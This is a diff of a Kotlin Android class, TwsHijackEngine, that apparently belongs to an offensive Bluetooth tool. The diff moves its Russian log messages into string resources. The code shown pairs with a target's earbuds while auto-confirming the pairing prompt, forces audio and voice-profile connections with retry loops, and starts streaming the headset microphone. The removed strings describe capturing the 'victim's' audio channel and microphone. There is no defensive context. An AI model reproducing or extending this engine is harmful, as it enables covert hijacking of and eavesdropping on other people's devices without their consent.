@@ -1,3 +1,7 @@
+// Deprecated platform APIs are still the only option on minSdk 26; their
+// replacements require API 33+ branches that this feature cannot take yet.
+@file:Suppress("DEPRECATION")
+
 package com.droid.dolphy.bluetooth.whisperpair
 
 import android.annotation.SuppressLint
@@ -8,6 +12,7 @@ import android.bluetooth.BluetoothManager
 import android.bluetooth.BluetoothProfile
 import android.content.BroadcastReceiver
 import android.content.Context
+import com.droid.dolphy.R
 import android.content.Intent
 import android.content.IntentFilter
 import android.os.Build
@@ -74,19 +79,19 @@ class TwsHijackEngine(private val context: Context) {
 
         val adapter = adapter
         if (adapter == null || !adapter.isEnabled) {
-            post(onLog, "Bluetooth недоступен")
+            post(onLog, context.getString(R.string.tws_bt_unavailable))
             isRunning = false
             return
         }
         val device = runCatching { adapter.getRemoteDevice(address) }.getOrNull()
         if (device == null) {
-            post(onLog, "Неверный адрес устройства")
+            post(onLog, context.getString(R.string.tws_invalid_address))
             isRunning = false
             return
         }
         targetDevice = device
 
-        safeLog("Цель: ${runCatching { device.name }.getOrNull() ?: "устройство"} [$address]")
+        safeLog(context.getString(R.string.tws_target, runCatching { device.name }.getOrNull() ?: context.getString(R.string.tws_device_fallback), address))
         runCatching { adapter.cancelDiscovery() }
         registerPairingReceiver(device, safeLog)
 
@@ -95,30 +100,30 @@ class TwsHijackEngine(private val context: Context) {
             return
         }
 
-        safeLog("A2DP: подключаю аудиоканал...")
+        safeLog(context.getString(R.string.tws_a2dp_connecting))
         val a2dp = awaitA2dpProxy(adapter)
         if (a2dp != null) {
             val started = connectA2dpReflect(a2dp, device)
-            safeLog(if (started) "A2DP: запрос отправлен, жду..." else "A2DP: connect недоступен на этой прошивке")
+            safeLog(context.getString(if (started) R.string.tws_a2dp_request_sent else R.string.tws_a2dp_connect_unsupported))
             if (awaitA2dpConnected(a2dp, device, 12000)) {
-                safeLog("A2DP: КАНАЛ ЗАХВАЧЕН — звук с телефона идёт в наушники жертвы")
+                safeLog(context.getString(R.string.tws_a2dp_hijacked))
             } else {
-                safeLog("A2DP: подключение не удалось (наушники заняты другим устройством?)")
+                safeLog(context.getString(R.string.tws_a2dp_failed))
             }
         } else {
-            safeLog("A2DP: профиль недоступен")
+            safeLog(context.getString(R.string.tws_a2dp_profile_unavailable))
         }
 
         val onHfpState: (BluetoothAudioManager.AudioState) -> Unit = { state ->
             when (state) {
                 is BluetoothAudioManager.AudioState.Connected -> {
                     hfpConnected = true
-                    safeLog("HFP: ГОЛОСОВОЙ КАНАЛ ЗАХВАЧЕН — микрофон жертвы доступен")
+                    safeLog(context.getString(R.string.tws_hfp_hijacked))
                     runCatching {
                         audioManager.startListening { listenState ->
                             when (listenState) {
                                 is BluetoothAudioManager.AudioState.Listening ->
-                                    safeLog("MIC: трансляция микрофона наушников активна")
+                                    safeLog(context.getString(R.string.tws_mic_active))
                                 is BluetoothAudioManager.AudioState.Error ->
                                     safeLog("MIC: ${listenState.message}")
                                 else -> {}
@@ -126,7 +131,7 @@ class TwsHijackEngine(private val context: Context) {
                         }
                     }
                 }
-                is BluetoothAudioManager.AudioState.Connecting -> safeLog("HFP: подключаю...")
+                is BluetoothAudioManager.AudioState.Connecting -> safeLog(context.getString(R.string.tws_hfp_connecting))
                 is BluetoothAudioManager.AudioState.Error -> {
                     hfpConnected = false
                     safeLog("HFP: ${state.message}")
@@ -136,11 +141,11 @@ class TwsHijackEngine(private val context: Context) {
             }
         }
 
-        safeLog("HFP: инициализация голосового профиля...")
+        safeLog(context.getString(R.string.tws_hfp_init))
         if (awaitAudioManagerReady()) {
             audioManager.connectAudioProfile(address, onHfpState)
         } else {
-            safeLog("HFP: инициализация не удалась")
+            safeLog(context.getString(R.string.tws_hfp_init_failed))
         }
 
         var a2dpRetries = 0
@@ -156,7 +161,7 @@ class TwsHijackEngine(private val context: Context) {
                 if (st != BluetoothProfile.STATE_CONNECTED && st != BluetoothProfile.STATE_CONNECTING) {
                     if (a2dpRetries < 8) {
                         a2dpRetries++
-                        safeLog("A2DP: канал потерян — реконнект $a2dpRetries/8")
+                        safeLog(context.getString(R.string.tws_a2dp_lost, a2dpRetries))
                         runCatching { connectA2dpReflect(a2dp, device) }
                     }
                 } else {
@@ -169,7 +174,7 @@ class TwsHijackEngine(private val context: Context) {
             ) {
                 hfpRetries++
                 lastHfpTry = now
-                safeLog("HFP: реконнект $hfpRetries/5")
+                safeLog(context.getString(R.string.tws_hfp_reconnect, hfpRetries))
                 audioManager.connectAudioProfile(address, onHfpState)
             }
 
@@ -177,7 +182,7 @@ class TwsHijackEngine(private val context: Context) {
                 lastStatus = now
                 val a2dpState = runCatching { a2dp?.getConnectionState(device) }.getOrNull()
                 safeLog(
-                    "Статус: A2DP=${stateName(a2dpState)} · HFP=${if (audioManager.isHfpConnected(address)) "OK" else "нет"}",
+                    context.getString(R.string.tws_status, stateName(a2dpState), if (audioManager.isHfpConnected(address)) "OK" else context.getString(R.string.tws_hfp_none)),
                 )
             }
         }
@@ -187,12 +192,12 @@ class TwsHijackEngine(private val context: Context) {
     private suspend fun ensureBonded(device: BluetoothDevice, log: (String) -> Unit): Boolean {
         when (runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)) {
             BluetoothDevice.BOND_BONDED -> return true
-            BluetoothDevice.BOND_BONDING -> log("Пара уже создаётся, жду...")
+            BluetoothDevice.BOND_BONDING -> log(context.getString(R.string.tws_bond_in_progress))
             else -> {
-                log("Спаривание с тихим подтверждением...")
+                log(context.getString(R.string.tws_pairing_silent))
                 val started = runCatching { device.createBond() }.getOrDefault(false)
                 if (!started) {
-                    log("Не удалось инициировать спаривание")
+                    log(context.getString(R.string.tws_pairing_init_failed))
                     return false
                 }
             }
@@ -201,12 +206,12 @@ class TwsHijackEngine(private val context: Context) {
         while (coroutineContext.isActive && isRunning && System.currentTimeMillis() < deadline) {
             val state = runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)
             if (state == BluetoothDevice.BOND_BONDED) {
-                log("СОПРЯЖЕНО")
+                log(context.getString(R.string.tws_bonded))
                 return true
             }
             delay(400)
         }
-        log("Спаривание не завершилось за 25с")
+        log(context.getString(R.string.tws_pairing_timeout))
         return false
     }
 
@@ -227,7 +232,7 @@ class TwsHijackEngine(private val context: Context) {
                     BluetoothDevice.EXTRA_PAIRING_VARIANT,
                     BluetoothDevice.ERROR,
                 )
-                log("Запрос пары (вариант $variant) — подтверждаю автоматически")
+                log(context.getString(R.string.tws_pair_request, variant))
                 try {
                     when {
                         variant == BluetoothDevice.PAIRING_VARIANT_PIN || variant == 0 || variant == 7 -> {
